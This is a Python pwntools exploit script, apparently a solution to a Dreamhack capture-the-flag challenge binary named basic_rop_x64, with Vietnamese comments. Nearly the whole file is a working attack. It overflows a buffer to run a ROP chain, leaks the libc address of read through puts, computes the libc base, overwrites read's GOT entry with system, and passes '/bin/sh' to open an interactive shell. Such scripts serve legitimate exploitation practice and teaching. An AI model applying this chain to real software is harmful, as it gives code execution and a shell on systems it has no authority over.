#!/usr/bin/python3

from pwn import *
exe=ELF('./basic_rop_x64')
p=process('./basic_rop_x64')
# p=remote('host3.dreamhack.games',19917)
# gdb.attach(p, gdbscript='''
# 	b*0x0000000000400819

# 	''')
gdb.attach(p,'''b*0x0000000000400819''')
libc=ELF('./libc.so.6')
rop_rdi=0x0000000000400883
rop_rsi_r15=0x0000000000400881
ret=0x00000000004005a9
puts_got=exe.got['puts']
puts_plt=exe.plt['puts']
write_plt=exe.plt['write']
read_plt=exe.plt['read']
read_got=exe.got['read']
payload=b'A'*60 + b'ABCD'*3
#######################################exploit##################################
#thuc hien ghi dia chi ham read_got ra ngoai
payload+=p64(rop_rdi)+p64(read_got)
payload+=p64(exe.plt['puts'])

#thuc hien goi toi ham read(0,read_got,0)==> system()
payload+=p64(rop_rdi)+p64(0)
payload+=p64(rop_rsi_r15)+p64(read_got)+p64(0)
payload+=p64(read_plt)
#thuc hien tim kiem bin/sh address
payload+=p64(rop_rdi)+p64(read_got+0x8)
payload+=p64(ret)
payload+=p64(read_plt)
print('sending payload',payload)
pause()
p.sendline(payload)
# p.recvuntil(0x40)
p.recvuntil(b'ABCD')
read=u64(p.recv(6).ljust(8,b'\x00'))
##################################################
# p.recvuntil()
# leak_puts=u64(p.recvn(6)+b'\x00\x00')
log.info("leak_got_puts: "+hex(read))
#tim duoc dia chi read_got tinsh dia chi lb_base
#lb_base = read_got - exe.libc['read']
lb_base=read-libc.sym['read']
system=lb_base+libc.sym['system']
log.info("libc base address : "+hex(lb_base))
log.info("system addrss: "+ hex(system))
p.send(b"/bin/sh\x00")
p.sendline(p64(system))

p.interactive()

#can xac dinh dia chi puts_got __ libc base __ and system address

#/